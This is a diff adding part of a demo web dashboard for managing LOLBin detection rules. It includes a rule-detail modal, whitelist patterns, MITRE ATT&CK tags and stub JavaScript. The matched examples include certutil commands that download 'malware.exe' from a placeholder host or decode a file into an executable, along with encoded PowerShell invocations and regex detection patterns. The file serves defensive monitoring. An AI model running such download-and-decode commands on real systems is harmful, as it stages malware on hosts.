+                            <button class="nav-link" id="context-tab" data-bs-toggle="tab" data-bs-target="#context" type="button" role="tab" aria-controls="context" aria-selected="false">Context</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="mitre-tab" data-bs-toggle="tab" data-bs-target="#mitre" type="button" role="tab" aria-controls="mitre" aria-selected="false">MITRE ATT&CK</button>
+                        </li>
+                    </ul>
+                    <div class="tab-content" id="ruleDetailTabsContent">
+                        <div class="tab-pane fade show active" id="overview" role="tabpanel" aria-labelledby="overview-tab">
+                            <div class="row mb-3">
+                                <div class="col-md-6">
+                                    <p class="text-white-50 mb-1">Rule Name</p>
+                                    <p class="fw-bold mb-3" id="detailRuleName">CertUtil Download</p>
+                                    
+                                    <p class="text-white-50 mb-1">LOLBin</p>
+                                    <p class="fw-bold mb-3" id="detailLolbin">certutil.exe</p>
+                                    
+                                    <p class="text-white-50 mb-1">Status</p>
+                                    <p class="fw-bold mb-3" id="detailStatus">
+                                        <span class="rule-status active"></span> Active
+                                    </p>
+                                </div>
+                                <div class="col-md-6">
+                                    <p class="text-white-50 mb-1">Severity</p>
+                                    <p class="fw-bold mb-3" id="detailSeverity">
+                                        <span class="severity-badge severity-4">4</span> Medium-High
+                                    </p>
+                                    
+                                    <p class="text-white-50 mb-1">Type</p>
+                                    <p class="fw-bold mb-3" id="detailType">
+                                        <span class="rule-category">Default</span>
+                                    </p>
+                                    
+                                    <p class="text-white-50 mb-1">Detections</p>
+                                    <p class="fw-bold mb-3" id="detailDetectionCount">23 alerts triggered</p>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">Description</p>
+                                    <p class="fw-bold mb-3" id="detailDescription">CertUtil used to download files from internet</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="pattern" role="tabpanel" aria-labelledby="pattern-tab">
+                            <div class="row mb-3">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">Detection Pattern (Regex)</p>
+                                    <div class="bg-dark p-3 rounded">
+                                        <code id="detailPattern">(urlcache|-urlcache|-f|-split|-encode|-decode)</code>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row mb-3">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">Example Commands Matched</p>
+                                    <ul class="list-group bg-transparent" id="detailExamples">
+                                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -f http://example.com/malware.exe C:\temp\file.exe</li>
+                                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -split -f http://example.com/malware.exe</li>
+                                        <li class="list-group-item bg-dark border-secondary">certutil.exe -decode encodedfile.txt output.exe</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="whitelist" role="tabpanel" aria-labelledby="whitelist-tab">
+                            <div class="row mb-3">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">Whitelist Patterns</p>
+                                    <ul class="list-group bg-transparent" id="detailWhitelist">
+                                        <li class="list-group-item bg-dark border-secondary">\.microsoft\.com</li>
+                                        <li class="list-group-item bg-dark border-secondary">\.windows\.com</li>
+                                        <li class="list-group-item bg-dark border-secondary">\.windowsupdate\.com</li>
+                                        <li class="list-group-item bg-dark border-secondary">certificate\.crt$</li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">Example Commands Ignored</p>
+                                    <ul class="list-group bg-transparent" id="detailWhitelistExamples">
+                                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -f https://www.microsoft.com/download.exe</li>
+                                        <li class="list-group-item bg-dark border-secondary">certutil.exe -decode certificate.crt</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="context" role="tabpanel" aria-labelledby="context-tab">
+                            <div class="row mb-3">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">Context Awareness</p>
+                                    <div class="mb-3" id="detailContextEnabled">
+                                        <span class="badge bg-secondary">No context awareness enabled</span>
+                                    </div>
+                                    <p class="text-white-50 mb-1">Context Processes</p>
+                                    <div id="detailContextProcesses">
+                                        <span class="badge bg-secondary">None</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="mitre" role="tabpanel" aria-labelledby="mitre-tab">
+                            <div class="row mb-3">
+                                <div class="col-12">
+                                    <p class="text-white-50 mb-1">MITRE ATT&CK Techniques</p>
+                                    <div class="d-flex flex-wrap gap-2 mb-3">
+                                        <span class="badge bg-secondary p-2">T1105 - Ingress Tool Transfer</span>
+                                        <span class="badge bg-secondary p-2">T1140 - Deobfuscate/Decode Files or Information</span>
+                                    </div>
+                                    <p class="text-white-50 mb-1">Tactics</p>
+                                    <div class="d-flex flex-wrap gap-2">
+                                        <span class="badge bg-secondary p-2">Command and Control</span>
+                                        <span class="badge bg-secondary p-2">Defense Evasion</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#editRuleModal" onclick="editCurrentRule()">Edit Rule</button>
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // Variables for current rule being viewed
+        let currentRule = '';
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Context awareness toggle for edit form
+            document.getElementById('contextAwarenessToggle').addEventListener('change', function() {
+                const optionsDiv = document.getElementById('contextAwarenessOptions');
+                optionsDiv.style.display = this.checked ? 'block' : 'none';
+            });
+            
+            // Context awareness toggle for new rule form
+            document.getElementById('newContextAwarenessToggle').addEventListener('change', function() {
+                const optionsDiv = document.getElementById('newContextAwarenessOptions');
+                optionsDiv.style.display = this.checked ? 'block' : 'none';
+            });
+            
+            // Custom LOLBin field toggle
+            document.getElementById('newRuleLolbin').addEventListener('change', function() {
+                const customField = document.getElementById('customLolbinField');
+                customField.style.display = this.value === 'other' ? 'block' : 'none';
+            });
+            
+            // Add whitelist pattern in edit form
+            document.getElementById('addWhitelistPattern').addEventListener('click', function() {
+                const input = document.getElementById('whitelistPatternInput');
+                if (input.value.trim()) {
+                    addWhitelistPattern(input.value.trim(), 'whitelistPatterns');
+                    input.value = '';
+                }
+            });
+            
+            // Add whitelist pattern in new rule form
+            document.getElementById('newAddWhitelistPattern').addEventListener('click', function() {
+                const input = document.getElementById('newWhitelistPatternInput');
+                if (input.value.trim()) {
+                    addWhitelistPattern(input.value.trim(), 'newWhitelistPatterns');
+                    input.value = '';
+                }
+            });
+            
+            // Handle save rule button
+            document.getElementById('saveRuleBtn').addEventListener('click', function() {
+                alert('Rule saved successfully!');
+                const modal = bootstrap.Modal.getInstance(document.getElementById('editRuleModal'));
+                modal.hide();
+            });
+            
+            // Handle create rule button
+            document.getElementById('createRuleBtn').addEventListener('click', function() {
+                alert('New rule created successfully!');
+                const modal = bootstrap.Modal.getInstance(document.getElementById('newRuleModal'));
+                modal.hide();
+            });
+
+            // Handle filters button
+            document.getElementById('applyFiltersBtn').addEventListener('click', function() {
+                alert('Filters applied!');
+                // In a real app, this would filter the rules based on the selected filters
+            });
+        });
+        
+        // Function to add whitelist pattern to UI
+        function addWhitelistPattern(pattern, containerId) {
+            const container = document.getElementById(containerId);
+            
+            const badge = document.createElement('span');
+            badge.className = 'badge bg-secondary p-2';
+            badge.innerHTML = `
+                ${pattern}
+                <button type="button" class="btn-close btn-close-white ms-2" style="font-size: 0.5rem;"></button>
+            `;
+            
+            // Add remove functionality
+            const closeBtn = badge.querySelector('.btn-close');
+            closeBtn.addEventListener('click', function() {
+                badge.remove();
+            });
+            
+            container.appendChild(badge);
+        }
+        
+        // Function to handle rule editing
+        function editRule(ruleName) {
+            currentRule = ruleName;
+            // In a real app, we would load the rule data from the server
+            // For demo, we'll just use the rule name to simulate loading data
+            document.getElementById('editRuleModalLabel').textContent = `Edit Rule: ${ruleName}`;
+            
+            // Show appropriate data based on rule name
+            switch(ruleName) {
+                case 'PowerShell Encoded Command':
+                    document.getElementById('editRuleName').value = 'PowerShell Encoded Command';
+                    document.getElementById('editRuleDescription').value = 'PowerShell executing encoded commands';
+                    document.getElementById('editRuleLolbin').value = 'powershell.exe';
+                    document.getElementById('editRuleSeverity').value = '4';
+                    document.getElementById('editRulePattern').value = '(-e|-enc|-encodedcommand)';
+                    break;
+                // Add other cases as needed
+                default:
+                    // Default to CertUtil Download for demo
+                    document.getElementById('editRuleName').value = 'CertUtil Download';
+                    document.getElementById('editRuleDescription').value = 'CertUtil used to download files from internet';
+                    document.getElementById('editRuleLolbin').value = 'certutil.exe';
+                    document.getElementById('editRuleSeverity').value = '4';
+                    document.getElementById('editRulePattern').value = '(urlcache|-urlcache|-f|-split|-encode|-decode)';
+            }
+        }
+        
+        // Function to handle viewing rule details
+        function viewRuleDetails(ruleName) {
+            currentRule = ruleName;
+            document.getElementById('ruleDetailModalLabel').textContent = `Rule Details: ${ruleName}`;
+            document.getElementById('detailRuleName').textContent = ruleName;
+            
+            // Show appropriate data based on rule name
+            switch(ruleName) {
+                case 'PowerShell Encoded Command':
+                    document.getElementById('detailLolbin').textContent = 'powershell.exe';
+                    document.getElementById('detailDescription').textContent = 'PowerShell executing encoded commands';
+                    document.getElementById('detailPattern').textContent = '(-e|-enc|-encodedcommand)';
+                    document.getElementById('detailDetectionCount').textContent = '42 alerts triggered';
+                    
+                    // Update examples
+                    const psExamples = document.getElementById('detailExamples');
+                    psExamples.innerHTML = `
+                        <li class="list-group-item bg-dark border-secondary">powershell.exe -encodedcommand JABjA...</li>
+                        <li class="list-group-item bg-dark border-secondary">powershell.exe -enc YwBhAGwA...</li>
+                        <li class="list-group-item bg-dark border-secondary">powershell.exe -e SQBFAFg...</li>
+                    `;
+                    
+                    // Update whitelist
+                    const psWhitelist = document.getElementById('detailWhitelist');
+                    psWhitelist.innerHTML = `<li class="list-group-item bg-dark border-secondary">No whitelist patterns defined</li>`;
+                    
+                    // Update whitelist examples
+                    const psWhitelistExamples = document.getElementById('detailWhitelistExamples');
+                    psWhitelistExamples.innerHTML = `<li class="list-group-item bg-dark border-secondary">No examples available</li>`;
+                    
+                    // Update context
+                    document.getElementById('detailContextEnabled').innerHTML = `<span class="badge bg-success">Context awareness enabled</span>`;
+                    document.getElementById('detailContextProcesses').innerHTML = `
+                        <span class="badge bg-info m-1">cmd.exe</span>
+                        <span class="badge bg-info m-1">wscript.exe</span>
+                    `;
+                    break;
+                // Add other cases as needed
+                default:
+                    // Default to CertUtil Download for demo
+                    document.getElementById('detailLolbin').textContent = 'certutil.exe';
+                    document.getElementById('detailDescription').textContent = 'CertUtil used to download files from internet';
+                    document.getElementById('detailPattern').textContent = '(urlcache|-urlcache|-f|-split|-encode|-decode)';
+                    document.getElementById('detailDetectionCount').textContent = '23 alerts triggered';
+                    
+                    // Reset to default examples
+                    const certExamples = document.getElementById('detailExamples');
+                    certExamples.innerHTML = `
+                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -f http://example.com/malware.exe C:\\temp\\file.exe</li>
+                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -split -f http://example.com/malware.exe</li>
+                        <li class="list-group-item bg-dark border-secondary">certutil.exe -decode encodedfile.txt output.exe</li>
+                    `;
+                    
+                    // Reset whitelist
+                    const certWhitelist = document.getElementById('detailWhitelist');
+                    certWhitelist.innerHTML = `
+                        <li class="list-group-item bg-dark border-secondary">\\.microsoft\\.com</li>
+                        <li class="list-group-item bg-dark border-secondary">\\.windows\\.com</li>
+                        <li class="list-group-item bg-dark border-secondary">\\.windowsupdate\\.com</li>
+                        <li class="list-group-item bg-dark border-secondary">certificate\\.crt$</li>
+                    `;
+                    
+                    // Reset whitelist examples
+                    const certWhitelistExamples = document.getElementById('detailWhitelistExamples');
+                    certWhitelistExamples.innerHTML = `
+                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -f https://www.microsoft.com/download.exe</li>
+                        <li class="list-group-item bg-dark border-secondary">certutil.exe -decode certificate.crt</li>
+                    `;
+                    
+                    // Reset context
+                    document.getElementById('detailContextEnabled').innerHTML = `<span class="badge bg-secondary">No context awareness enabled</span>`;
+                    document.getElementById('detailContextProcesses').innerHTML = `<span class="badge bg-secondary">None</span>`;
+            }
+        }
+        
+        // Function to toggle rule status
+        function toggleRule(ruleName, enabled) {
+            const message = enabled ? `${ruleName} has been enabled` : `${ruleName} has been disabled`;
+            alert(message);
+            
+            // In a real app, we would update the status on the server and refresh the UI
+            // For demo, we'll just update the table row
+            const rows = document.querySelectorAll('#rulesTable tr');
+            for (let row of rows) {
+                const nameCell = row.children[1];
+                if (nameCell && nameCell.textContent === ruleName) {
+                    const statusCell = row.children[0];
+                    const statusIndicator = statusCell.querySelector('.rule-status');
+                    const statusText = statusCell.querySelector('span:not(.rule-status)');
+                    
+                    if (enabled) {
+                        statusIndicator.className = 'rule-status active';
+                        statusText.textContent = 'Active';
+                    } else {
+                        statusIndicator.className = 'rule-status disabled';
+                        statusText.textContent = 'Disabled';
+                    }
+                    
+                    // Update toggle button
+                    const toggleBtn = row.querySelector('button:nth-child(2)');
+                    if (enabled) {
+                        toggleBtn.innerHTML = '<i class="fas fa-ban"></i>';
+                        toggleBtn.title = 'Disable Rule';
+                        toggleBtn.setAttribute('onclick', `toggleRule('${ruleName}', false)`);
+                    } else {
+                        toggleBtn.innerHTML = '<i class="fas fa-check"></i>';
+                        toggleBtn.title = 'Enable Rule';
+                        toggleBtn.setAttribute('onclick', `toggleRule('${ruleName}', true)`);
+                    }
+                }
+            }
+        }
+        
+        // Function to edit currently viewed rule
+        function editCurrentRule() {
+            editRule(currentRule);
+        }
+    </script>
+</body>
+</html>
